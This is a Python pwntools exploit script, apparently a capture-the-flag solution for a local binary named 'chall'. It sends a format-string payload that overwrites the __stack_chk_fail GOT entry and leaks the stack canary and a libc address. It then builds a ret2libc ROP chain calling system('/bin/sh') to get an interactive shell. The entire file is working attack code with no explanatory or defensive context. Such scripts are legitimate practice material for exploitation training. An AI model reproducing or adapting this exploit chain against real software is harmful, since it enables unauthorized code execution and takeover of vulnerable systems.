from pwn import *

context.log_level = 'CRITICAL'
context.binary = binary = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

vuln = binary.symbols.vuln
stack_chk_fail = p16(binary.got.__stack_chk_fail)
libc_offset = 0x21bf10

fmt_payload = f'%{vuln}c%15$hnLEAK%31$p\n%4$p\n'.encode().ljust(65, b'\x00') + stack_chk_fail

while True:
	try:
		p = process()
		p.send(fmt_payload)

		p.recvuntil(b'LEAK')

		canary = int(p.recvline()[:-1].decode(), 16)
		libc_leak = int(p.recvline()[:-1].decode(), 16)

		break
	except:
		continue

print(f'Canary: {hex(canary)}')
print(f'LIBC Leak: {hex(libc_leak)}')

libc.address = libc_leak - libc_offset

print(f'LIBC Base: {hex(libc.address)}')

rop = ROP(libc)

pop_rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
ret = p64(rop.find_gadget(['ret'])[0])

system = p64(libc.symbols.system)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

print(f'system(): {hex(u64(system))}')
print(f'/bin/sh: {hex(u64(bin_sh))}')

sh_payload = b'A'
sh_payload += p64(canary)
sh_payload += b'B' * 8
sh_payload += pop_rdi
sh_payload += bin_sh
sh_payload += ret
sh_payload += system

p.send(sh_payload)
p.recvrepeat(1)

p.interactive()
